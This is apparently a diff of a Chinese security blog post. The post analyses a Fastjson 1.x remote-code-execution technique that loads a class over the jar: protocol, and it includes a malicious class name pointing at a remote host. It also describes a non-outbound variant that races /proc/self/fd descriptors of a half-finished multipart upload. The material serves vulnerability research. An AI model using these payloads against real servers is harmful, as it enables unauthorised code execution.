@@ -37,16 +37,16 @@
         <blockquote>
 <p>距离上一次手工分析漏洞+写博客还是在成为社畜前。</p>
 </blockquote>
-<h3 id="JsonType与新的攻击面"><a href="#JsonType与新的攻击面" class="headerlink" title="JsonType与新的攻击面"></a>JsonType与新的攻击面</h3><p>对于Fastjson1X而言，即使传入的@Type不在白名单里，如果这个类被JsonType注解或者是expectClass也是可以后续被loadClass类加载的。</p>
+<h3 id="JsonType与新的攻击面"><a href="#JsonType与新的攻击面" class="headerlink" title="JsonType与新的攻击面"></a>JsonType与新的攻击面</h3><p>对于Fastjson1.X而言，即使传入的@Type不在白名单里，如果这个类存在JsonType注解或者是expectClass是可以后续通过loadClass进行类加载的。</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>autoTypeSupport <span class="token operator">||</span> jsonType <span class="token operator">||</span> expectClassFlag<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">boolean</span> cacheClass <span class="token operator">=</span> autoTypeSupport <span class="token operator">||</span> jsonType<span class="token punctuation">;</span>
     clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> cacheClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>问题在于之前的研究思路都局限在本地class类加载，构造gadget调用一系列getter&#x2F;setter进行恶意利用，忽视了jar协议远程加载类的攻击面。</p>
-<p>该攻击面没被发现也与日常调试环境有关。因为用 IDEA 直接启动默认走的是 <code>AppClassLoader</code>（普通应用类加载器），并且正常来说也不会通过 <code>ParserConfig.defaultClassLoader</code> 也不会显式设置为能解析 jar协议的加载器。</p>
+<p>先前的研究思路都局限于本地class类加载，通过构造gadget调用一系列getter&#x2F;setter进行恶意利用，忽视了jar协议远程加载类的攻击面。</p>
+<p>话说回来，这个攻击面没被发现也与日常调试环境有关。因为用 IDEA 启动调试项目默认走的是 <code>AppClassLoader</code>（普通应用类加载器），并且正常来说也不会通过 <code>ParserConfig.defaultClassLoader</code> 来显式设置能解析 jar协议的类加载器。</p>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260721120111473.png" alt="image-20260721120111473"></p>
-<p>探测阶段的 getResourceAsStream 只会按 classpath 相对路径查找，拉不起来远程 jar 。而在Spring FatJar 场景，默认的是org.springframework.boot.loader.LaunchedURLClassLoader。该加载器继承自URLClassLoader，因此会通过jar协议下载class至tmp目录，例如windows是：</p>
+<p>普通类加载器一般没有实现 getResourceAsStream，通常只会从 classpath 本地寻找待加载类，因此不支持jar协议解析 。而在Spring FatJar 场景，默认会使用org.springframework.boot.loader.LaunchedURLClassLoader。LaunchedURLClassLoader继承自URLClassLoader，可以通过jar协议下载class至tmp目录，例如windows是：</p>
 <pre><code>C:\Users\&lt;&gt;\AppData\Local\Temp\jar_cache5413977929028160987.tmp
 </code></pre>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260721144444003.png" alt="image-20260721144444003"></p>
@@ -59,18 +59,19 @@
     clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
 &#125;
 </code></pre>
-<p>以上为checkAutoType的大致流程，在通过校验后，会拿到对应的反序列化器（JavaBeanDeserializer）并调用对应的deserialze方法。最终通过createInstance实例化，进而触发static段实现RCE。</p>
+<p>以上为checkAutoType的大致流程，在通过checkAutoType的校验后，会根据@type拿相应的反序列化器（JavaBeanDeserializer），并调用对应的deserialze方法。最终通过createInstance实例化，进而触发static段实现RCE。</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>constructor <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     object <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
     object <span class="token operator">=</span> beanInfo<span class="token punctuation">.</span>factoryMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="JVM-类名命名限制"><a href="#JVM-类名命名限制" class="headerlink" title="JVM 类名命名限制"></a>JVM 类名命名限制</h3><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>注意构造的类名经过checkAutoType规范化后是这样的。注意 Class.getName() 显示成jar:http:..3232270722:19005.evil!.Exploit 是因为把 &#x2F; 显示成 .了。</p>
-<pre><code>class jar:http:..3232270722:19005.evil!.Exploit
+<h3 id="JVM-类名命名限制"><a href="#JVM-类名命名限制" class="headerlink" title="JVM 类名命名限制"></a>JVM 类名命名限制</h3><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>注意构造的类名经过checkAutoType规范化后为如下形式：</p>
+<pre><code>jar:http:..3232270722:19005.evil!.Exploit
 </code></pre>
+<p><strong>PS：Class.getName() 显示成jar:http:..3232270722:19005.evil!.Exploit 是因为把 &#x2F; 显示成 .了。</strong></p>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260721151031628.png" alt="image-20260721151031628"></p>
-<p>所以恶意类名应该构造为 <code>class jar:http:..3232270722:19005.evil!/Exploit</code></p>
+<p>所以恶意类名应该构造为 <code>jar:http:..3232270722:19005.evil!/Exploit</code></p>
 <p>命名规则具体见<a target="_blank" rel="noopener" href="https://github.com/openjdk/jdk8u/blob/master/hotspot/src/share/vm/classfile/classFileParser.cpp#L4024">https://github.com/openjdk/jdk8u/blob/master/hotspot/src/share/vm/classfile/classFileParser.cpp#L4024</a></p>
 <p>不相等则抛出异常：</p>
 <pre class="line-numbers language-c++"><code class="language-c++">// Checks if name in class file matches requested name
@@ -86,9 +87,9 @@ if (name != NULL && class_name != name) {
   return nullHandle;
 }
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="9"><a href="#9" class="headerlink" title="9+"></a>9+</h4><p>jdk9+加入了额外校验， &#x2F;&#x2F; 首&#x2F;、尾&#x2F;、连续 &#x2F;&#x2F; 全部非法。</p>
+<h4 id="9"><a href="#9" class="headerlink" title="9+"></a>9+</h4><p>相比于java8，java9+加入了额外的校验逻辑， &#x2F;&#x2F; 首&#x2F;、尾&#x2F;、连续 &#x2F;&#x2F; 全部非法。</p>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260721152608539.png" alt="image-20260721152608539"></p>
-<p>所以这也是为什么不能直接通过http协议一把嗦打穿的原因。</p>
+<p>所以这也是为什么不能直接通过jar:http一把嗦打穿的原因。</p>
 <pre><code>Caused by: java.lang.ClassFormatError: Illegal class name &quot;jar:http://3232270722:19005/evil!/Exploit&quot; in class file jar:http://3232270722:19005/evil!/Exploit
         at java.base/java.lang.ClassLoader.defineClass1(Native Method)
         at java.base/java.lang.ClassLoader.defineClass(ClassLoader.java:1016)
@@ -97,14 +98,14 @@ if (name != NULL && class_name != name) {
 </code></pre>
 <h3 id="不出网-JDK高版本利用"><a href="#不出网-JDK高版本利用" class="headerlink" title="不出网+JDK高版本利用"></a>不出网+JDK高版本利用</h3><p>该漏洞的主要限制有两个：</p>
 <ol>
-<li>需要出网</li>
+<li>需要出网。</li>
 <li>目前payload只能在JDK8利用。</li>
 </ol>
-<p>这里立刻想到利用 tomcat 缓存临时文件的特性：tomcat &#x2F; Spring 使用 commons-fileupload 处理 multipart，一旦上传 part 体量超过 <code>DiskFileItemFactory.DEFAULT_SIZE_THRESHOLD</code>（默认 <strong>10240 &#x3D; 10KB</strong>），会将数据从内存落到临时文件 <code>upload_*.tmp</code>。攻击时<strong>故意不发送</strong>文件 part 的结束定界符，服务端会一直等待剩余内容，临时文件 FD 保持打开，再 race：</p>
+<p>这里立刻想到利用 tomcat 缓存临时文件的特性：tomcat &#x2F; Spring 会使用 commons-fileupload 处理 multipart，一旦上传的 part 字节数超过 <code>DiskFileItemFactory.DEFAULT_SIZE_THRESHOLD</code>（默认 <strong>10240 &#x3D; 10KB</strong>），会将数据从内存落到临时文件 <code>upload_*.tmp</code>。所以可以在上传时<strong>故意不发送</strong> 文件 part 的结束定界符，服务端会一直等待剩余内容，此时临时文件 FD 保持打开，再 race 即可：</p>
 <pre class="line-numbers language-text"><code class="language-text">jar:file:/proc/self/fd/N!/POCN
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这样无需出网 HTTP 拉 jar，也绕开 JDK9+ 对类名中 <code>//</code> 的限制（<code>jar:file:/proc/...</code> 为单斜杠路径）。</p>
-<p>不过这个思路还有一些坑。</p>
+<p>这样就不需要通过 jar:http 拉 jar，同时也绕开了 JDK9+ 对类名中 <code>//</code> 的限制（<code>jar:file:/proc/...</code> 为单斜杠路径）。</p>
+<p>不过这个思路还有一些坑需要解决。</p>
 <h4 id="临时文件不完整"><a href="#临时文件不完整" class="headerlink" title="临时文件不完整"></a>临时文件不完整</h4><p>Commons FileUpload 的 <code>DiskFileItem</code> 底层用 <code>DeferredFileOutputStream</code> &#x2F; <code>ThresholdingOutputStream</code>，阈值为DEFAULT_THRESHOLD：</p>
 <pre class="line-numbers language-java"><code class="language-java">DiskFileItemFactory<span class="token punctuation">.</span>DEFAULT_SIZE_THRESHOLD <span class="token operator">=</span> <span class="token number">10240</span>  <span class="token comment" spellcheck="true">// 10KB</span>
 <span class="token keyword">public</span> <span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -114,8 +115,7 @@ if (name != NULL && class_name != name) {
             <span class="token function">setCharsetDefault</span><span class="token punctuation">(</span>DEFAULT_CHARSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>超过阈值会把已有数据刷进 <code>upload_xxxx.tmp</code>，后续写入走磁盘文件</p>
-<p>本来以为通过在STORED里面填充jar至10240字节的整数倍就可以缓存了，但是实际测试发现缓存的文件<strong>永远会少12字节，最终导致jar不合法类加载失败</strong>，这里让AI读了下源码：</p>
+<p>本来以为通过在STORED里面填充jar至10240字节的整数倍就可以刷进完整的jar了，但是实际测试发现缓存的文件<strong>会少12字节，最终导致jar不合法类加载失败</strong>，这里让AI读了下源码：</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 前缀：\r\n--</span>
 <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> BOUNDARY_PREFIX <span class="token operator">=</span> <span class="token punctuation">{</span>CR<span class="token punctuation">,</span> LF<span class="token punctuation">,</span> DASH<span class="token punctuation">,</span> DASH<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
@@ -124,8 +124,8 @@ if (name != NULL && class_name != name) {
 <span class="token comment" spellcheck="true">// keepRegion = 整段 delimiter 的长度</span>
 <span class="token keyword">this</span><span class="token punctuation">.</span>keepRegion <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>boundary<span class="token punctuation">.</span>length<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 含 CRLF-- + boundary 文本</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>解析 body 时不是把读到的字节立刻全部写进 DiskFileItem，而是用 ItemInputStream 边读边找 下一个边界。而\r\n–为4个字节，我构造的文件上传boundary为8个字节，加起来正好是12个字节</p>
-<p>所以在 part 尚未结束时，写路径上总会留 <strong>最后 12 字节</strong> 在未 flush 的缓冲里。后续再测试的时候把定界符增加到9字节，确实正好少了1字节（这里我已经填充垃圾字节了）：</p>
+<p>恍然大悟，因为之前为了hang住上传的请求故意不发送结束定界符<code>\r\n--xxxxxxxx</code>。所以这里的实现再解析 body 时不是把读到的字节立刻全部写进 DiskFileItem，而是用 ItemInputStream 边读边找定界符。其中\r\n–为4个字节，构造的boundary为8个字节，加起来正好是12个字节。</p>
+<p>所以在 part 尚未结束时，总会留 <strong>最后 12 字节</strong> 在未 flush 的缓冲里。后续再测试的时候把定界符增加到9字节，确实正好少了1字节（这里我已经填充垃圾字节了）：</p>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260721193817336.png" alt="image-20260721193817336"></p>
 <p>因此正确构造是在jar后构造12个垃圾字节做占位。</p>
 <h4 id="classname-gt-fd"><a href="#classname-gt-fd" class="headerlink" title="classname -&gt; fd"></a>classname -&gt; fd</h4><p>此外还有一个问题，由于上传的临时文件需要爆破 fd，并且受到类加载限制，我们利用的类名又要和爆破出来的fd一致。所以我这里用的方法更加暴力，就是在jar里面写入要爆破的所有fd类名，比如20到60，后续在爆破的时候同样race 20-60区间的fd即可。</p>
@@ -490,7 +490,14 @@ DEFAULT_MIN_JAR_SIZE <span class="token operator">=</span> int<span class="token
 </code></pre>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260721194659168.png" alt="image-20260721194659168"></p>
 <h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>标题党了，其实还是会有竞争fd不成功的限制）并且在盲盒场景这样最多只能打1次，因为利用完会产生很多fd :(</p>
-<p>其它思路可以想到的是我们可以先通过 <code>jar:http:..3232270722:19005.evil!.Exploit</code>落盘临时文件，因为高版本JDK的限制只是不在加载带有 <code>//</code>的类了，但是恶意class是会落到临时目录下的，后续通过file协议遍历fd似乎也有机会。不过这个思路要解决的问题就更多了。</p>
+<p>其它思路：可以想到的是我们可以先通过 <code>jar:http:..3232270722:19005.evil!.Exploit</code>落盘临时文件，因为高版本JDK的限制只是不在加载带有 <code>//</code>的类了，但是恶意class是会落到临时目录下的，后续通过file协议遍历fd也可以（不过这种方法需要出网）。</p>
+<ol>
+<li><p>一个请求通过 jar:http 拖住请求，另一个请求遍历fd。</p>
+</li>
+<li><p>另一种是在一个请求内下载，然后通过set里面放一堆fd爆破，这也是我刚刚公众号刷到的payload。一开始在想第一个没竞争成功不就失败了吗，后来发现我们构造的类名如果是以Error或者Exception结尾的就可以规避这个问题了。</p>
+<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20260722163651670.png" alt="image-20260722163651670"></p>
+</li>
+</ol>
 
     </div>
 
